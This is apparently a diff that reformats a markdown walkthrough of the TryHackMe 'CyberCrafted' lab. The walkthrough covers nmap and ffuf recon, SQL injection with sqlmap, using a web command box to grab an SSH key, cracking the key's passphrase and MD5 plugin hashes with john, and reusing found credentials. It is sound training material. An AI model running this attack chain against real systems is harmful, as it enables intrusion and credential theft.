@@ -77,15 +77,15 @@ Host is up (0.094s latency).
 ```console
 PORT      STATE SERVICE   VERSION
 25565/tcp open  minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)
-```
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 6.74 seconds
-❯ k1b0r@pwned~/thm/CyberCrafted took 6s 
+```
 
 
 With the open ports mapped out, my next move was checking whether this site spread across more than one vhost, since a single `/secret/` listing on the base domain wasn't much to work with on its own:
 
+```console
 ❯ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cybercrafted.thm/ -H "Host: FUZZ.cybercrafted.thm" -fc 404,302,403
 
         /'___\  /'___\           /'___\       
@@ -114,11 +114,13 @@ www                     [Status: 200, Size: 832, Words: 236, Lines: 35, Duration
 admin                   [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 130ms]
 www.admin               [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 99ms]
 [WARN] Caught keyboard interrupt (Ctrl-C)
+```
 
 
 That first filter was too aggressive and hid `store` behind the same noise as everything else, so I loosened it and reran the fuzz to make sure I wasn't missing anything:
 
- ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cybercrafted.thm/ -H "Host: FUZZ.cybercrafted.thm" -fc 404,302
+```console
+❯ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cybercrafted.thm/ -H "Host: FUZZ.cybercrafted.thm" -fc 404,302
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -145,6 +147,7 @@ ________________________________________________
 www                     [Status: 200, Size: 832, Words: 236, Lines: 35, Duration: 99ms]
 store                   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 91ms]
 admin                   [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 510ms]
+```
 
 `admin.cybercrafted.thm` looked like the natural next target, and testing its login form for SQL injection paid off almost immediately. Once I'd confirmed the injection point, I let `sqlmap` take over and enumerate what was actually sitting behind it:
 
@@ -200,6 +203,7 @@ http://admin.cybercrafted.thm/panel.php
 
 That panel had a command execution box on it, about as direct an RCE primitive as it gets, so rather than pop a full reverse shell right away I used it first to grab a copy of `xXUltimateCreeperXx`'s SSH private key. With the private key in hand, the passphrase was the only thing standing between me and a proper SSH session, so I ran it through `john`:
 
+```console
 ❯ john --wordlist=/opt/SecLists/Passwords/rockyou.txt ./ssh
 [pwned:458818] [[63722,0],0] ORTE_ERROR_LOG: Data unpack would read past end of buffer in file util/show_help.c at line 501
 Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
@@ -215,36 +219,45 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 creepin2006      (ir_rsa)
 1g 0:00:01:13 37.87% (ETA: 23:06:07) 0.01357g/s 75527p/s 75527c/s 75527C/s mickaela2..micka2006
 Session aborted
+```
 
 That cracked in just over a minute, handing me the passphrase I needed to unlock the key and SSH in as `xxultimatecreeperxx`. Once I was in, I started poking around the Minecraft server directory that gives this box its theme:
 
+```console
 xxultimatecreeperxx@cybercrafted:/opt/minecraft$ cat note.txt 
 Just implemented a new plugin within the server so now non-premium Minecraft accounts can game too! :)
 - cybercrafted
 
 P.S
 Will remove the whitelist soon.
+```
 
 The note's mention of a login plugin and a soon-to-be-removed whitelist pointed me straight at the `LoginSystem` plugin directory, so that's where I went next:
 
+```console
 xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ ls
 language.yml  log.txt  passwords.yml  settings.yml
 xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat passwords.yml 
 cybercrafted: dcbf543ee264e2d3a32c967d663e979e
 madrinch: 42f749ade7f9e195bf475f37a44cafcb
+```
 
 The `cybercrafted` hash didn't crack for me in the time I gave it, but `madrinch`'s MD5 fell quickly:
 
+```
 madrinch: 42f749ade7f9e195bf475f37a44cafcb = Password123
+```
 
 While I was already in that plugin directory, I also checked `settings.yml`, since Bukkit plugins frequently store their own database credentials right alongside everything else:
 
+```yaml
 database:
   username: bukkit
   isolation: SERIALIZABLE
   driver: org.sqlite.JDBC
   password: walrus
   url: jdbc:sqlite:{DIR}{NAME}.db
+```
 
 Between `madrinch`'s cracked password and that database credential, one of them was worth trying against the box's own `cybercrafted` system account, and it paid off:
 
